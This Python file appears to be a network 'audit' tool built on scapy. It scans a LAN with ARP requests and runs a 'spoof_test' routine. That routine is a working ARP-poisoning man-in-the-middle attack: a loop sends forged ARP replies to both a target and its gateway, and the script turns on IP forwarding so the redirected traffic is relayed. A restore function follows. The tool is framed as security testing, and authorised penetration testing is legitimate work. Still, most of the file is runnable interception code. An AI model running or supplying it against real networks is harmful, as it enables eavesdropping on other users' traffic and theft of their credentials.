"""
network_audit.py - ARP Scanner & MITM Auditor
Handles network mapping and ARP security testing.
"""

import os
import threading
import time
from scapy.all import ARP, Ether, srp, send, conf
from rich.console import Console
from rich.table import Table

console = Console()

class ARPAuditor:
    def __init__(self, interface):
        self.interface = interface
        self.gateway_ip = self._get_gateway()
        self.gateway_mac = None
        self.targets = []
        self.is_spoofing = False

    def _get_gateway(self):
        """Estimate gateway IP from local IP."""
        try:
            from scapy.all import get_if_addr, conf
            local_ip = get_if_addr(self.interface)
            parts = local_ip.split('.')
            return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
        except:
            return None

    def scan_network(self, ip_range=None):
        """Scans the network for active hosts using ARP."""
        if not ip_range:
            from scapy.all import get_if_addr
            local_ip = get_if_addr(self.interface)
            ip_range = f"{local_ip}/24"

        console.print(f"[bold cyan]🔍 Scanning network: [white]{ip_range}[/]...[/]")
        
        try:
            # Create ARP request packet
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp

            result = srp(packet, timeout=3, iface=self.interface, verbose=False)[0]

            self.targets = []
            for sent, received in result:
                self.targets.append({'ip': received.psrc, 'mac': received.hwsrc})
                if received.psrc == self.gateway_ip:
                    self.gateway_mac = received.hwsrc

            self._display_targets()
            return self.targets
        except Exception as e:
            console.print(f"[bold red]Scan Error:[/] {e}")
            return []

    def _display_targets(self):
        table = Table(title="🌐 Active Network Hosts", title_style="bold cyan")
        table.add_column("IP Address", style="green")
        table.add_column("MAC Address", style="cyan")
        table.add_column("Status", style="magenta")

        for t in self.targets:
            status = "[bold yellow]GATEWAY[/]" if t['ip'] == self.gateway_ip else "Client"
            table.add_row(t['ip'], t['mac'], status)
        
        console.print(table)

    def enable_ip_forwarding(self):
        """Enables IP forwarding for MITM stability."""
        console.print("[bold yellow]⚙️ Attempting to enable IP Forwarding...[/]")
        try:
            if os.name == 'posix': # Linux/Mac
                os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
                console.print("[green]✔ IP Forwarding enabled.[/]")
            else:
                console.print("[dim]Note: Please enable IP Forwarding in Windows registry if needed.[/]")
        except:
            console.print("[red]✘ Failed to enable IP Forwarding.[/]")

    def spoof_test(self, target_ip, gateway_ip):
        """Performs a security audit by testing if ARP redirection works."""
        target_mac = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            console.print("[bold red]Error:[/] Could not resolve MAC addresses for Target or Gateway.")
            return

        self.is_spoofing = True
        console.print(f"[bold red]☢ Starting Flow Redirection Test:[/] [cyan]{target_ip}[/] ⟷ [white]You[/] ⟷ [yellow]{gateway_ip}[/]")
        
        def run_test():
            try:
                while self.is_spoofing:
                    # Tell Target I am the Gateway
                    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
                    # Tell Gateway I am the Target
                    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                    time.sleep(2)
            except Exception as e:
                console.print(f"[red]Spoof error:[/] {e}")

        self.thread = threading.Thread(target=run_test, daemon=True)
        self.thread.start()
        console.print("[bold green]✔ Flow redirection active.[/] [dim]Press Ctrl+C in 'sniff' or stop the module.[/]")

    def stop_spoof_test(self, target_ip, gateway_ip):
        """Restores the network to its original state."""
        self.is_spoofing = False
        console.print("[bold cyan]🧹 Restoring network ARP tables...[/]")
        try:
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)
            
            # Send correct MACs back to the clients
            send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
            console.print("[green]✔ Network restored.[/]")
        except Exception as e:
            console.print(f"[red]Restore error:[/] {e}")

    def _get_mac(self, ip):
        """Resolves MAC address for a given IP."""
        for t in self.targets:
            if t['ip'] == ip:
                return t['mac']
        
        # If not in list, try to resolve once
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=2, iface=self.interface, verbose=False)[0]
        if result:
            return result[0][1].hwsrc
        return None
